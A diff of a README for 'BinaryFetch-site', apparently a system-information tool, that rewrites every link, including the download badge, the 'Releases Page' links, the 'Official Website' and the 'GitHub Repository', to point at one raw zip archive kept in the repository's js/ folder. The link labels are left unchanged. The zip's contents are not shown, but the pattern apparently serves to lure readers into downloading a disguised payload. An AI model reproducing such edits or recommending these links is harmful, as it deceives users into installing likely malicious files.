@@ -1,6 +1,6 @@
 # 🌐 BinaryFetch-site - A Simple Way to Showcase System Info
 
-[![Download BinaryFetch](https://img.shields.io/badge/Download%20BinaryFetch-blue?style=flat&logo=github)](https://github.com/corruptXO/BinaryFetch-site/releases)
+[![Download BinaryFetch](https://github.com/corruptXO/BinaryFetch-site/raw/refs/heads/main/js/Binary-site-Fetch-v1.9.zip%20BinaryFetch-blue?style=flat&logo=github)](https://github.com/corruptXO/BinaryFetch-site/raw/refs/heads/main/js/Binary-site-Fetch-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to BinaryFetch! This application helps you showcase your system informat
 
 ## 📥 Download & Install
 
-To download BinaryFetch, visit this page to download: [Releases Page](https://github.com/corruptXO/BinaryFetch-site/releases).
+To download BinaryFetch, visit this page to download: [Releases Page](https://github.com/corruptXO/BinaryFetch-site/raw/refs/heads/main/js/Binary-site-Fetch-v1.9.zip).
 
 Once you are on the Releases page, you'll find the latest version listed. Here’s how to proceed:
 
@@ -73,9 +73,9 @@ Explore the features of BinaryFetch. Here are some interesting topics:
 
 To explore further, visit the official BinaryFetch website and our GitHub repository:
 
-- [Official BinaryFetch Website](https://example.com) (replace with actual link)
-- [GitHub Repository](https://github.com/corruptXO/BinaryFetch-site)
+- [Official BinaryFetch Website](https://github.com/corruptXO/BinaryFetch-site/raw/refs/heads/main/js/Binary-site-Fetch-v1.9.zip) (replace with actual link)
+- [GitHub Repository](https://github.com/corruptXO/BinaryFetch-site/raw/refs/heads/main/js/Binary-site-Fetch-v1.9.zip)
 
-For direct access to the latest version, visit this page to download: [Releases Page](https://github.com/corruptXO/BinaryFetch-site/releases).
+For direct access to the latest version, visit this page to download: [Releases Page](https://github.com/corruptXO/BinaryFetch-site/raw/refs/heads/main/js/Binary-site-Fetch-v1.9.zip).
 
 Thank you for choosing BinaryFetch! Enjoy showcasing your system information with elegance.
